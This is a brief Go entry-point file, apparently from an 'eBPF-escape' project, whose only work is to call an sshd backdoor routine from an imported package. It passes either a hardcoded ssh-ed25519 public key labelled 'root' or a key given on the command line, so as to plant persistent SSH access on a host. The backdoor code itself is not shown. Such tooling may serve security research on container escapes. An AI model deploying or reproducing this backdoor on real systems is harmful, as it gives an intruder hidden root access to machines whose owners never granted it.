//go:build 386 || amd64

package main

import (
	"os"

	"github.com/yoeelingBin/eBPF-escape/pkg/sshd"
)

func main() {
	if len(os.Args) < 2 {
		sshd.SshdBackdoor("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOZOTdoCvyxP9XOxKvlspxRszDhgOH7xcAQGYPqKGiVM root")
	} else {
		sshd.SshdBackdoor(os.Args[1])
	}
}
